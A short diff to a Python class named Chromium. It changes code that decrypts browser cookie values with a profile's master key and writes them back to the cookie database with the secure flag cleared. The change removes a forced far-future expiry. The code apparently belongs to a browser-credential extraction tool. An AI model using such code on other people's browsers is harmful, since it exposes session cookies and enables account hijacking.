@@ -182,7 +182,7 @@ class Chromium:
             try:
                 decrypted_value = self.dump(profile, encrypted_value, master_key, False)
                 cursor.execute(
-                    "UPDATE cookies SET value = ?, expires_utc = 99999999999999999, is_secure = 0 WHERE host_key = ? AND name = ?",
+                    "UPDATE cookies SET value = ?, is_secure = 0 WHERE host_key = ? AND name = ?",
                     (decrypted_value, host_key, name)
                 )
                 length += 1
